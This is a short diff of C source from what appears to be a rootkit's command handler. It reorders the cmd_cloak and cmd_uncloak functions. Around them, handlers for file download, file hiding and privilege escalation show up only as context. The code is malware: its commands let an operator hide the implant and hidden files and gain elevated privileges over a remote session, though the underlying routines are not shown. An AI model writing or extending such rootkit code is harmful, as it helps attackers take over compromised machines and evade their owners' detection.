@@ -89,6 +89,18 @@ int cmd_download(struct rk_session *s, const char *arg)
 	return error;
 }
 
+int cmd_cloak(struct rk_session *s, const char *arg)
+{
+	rk_cloak();
+	return rk_send_response(s, "CLOAK OK");
+}
+
+int cmd_uncloak(struct rk_session *s, const char *arg)
+{
+	rk_uncloak();
+	return rk_send_response(s, "UNCLOAK OK");
+}
+
 int cmd_hide_file(struct rk_session *s, const char *arg)
 {
 	if (!arg || !*arg)
@@ -213,16 +225,4 @@ int cmd_escalate(struct rk_session *s, const char *arg)
 {
 	rk_escalate();
 	return rk_send_response(s, "ESCALATE OK");
-}
-
-int cmd_cloak(struct rk_session *s, const char *arg)
-{
-	rk_cloak();
-	return rk_send_response(s, "CLOAK OK");
-}
-
-int cmd_uncloak(struct rk_session *s, const char *arg)
-{
-	rk_uncloak();
-	return rk_send_response(s, "UNCLOAK OK");
 }
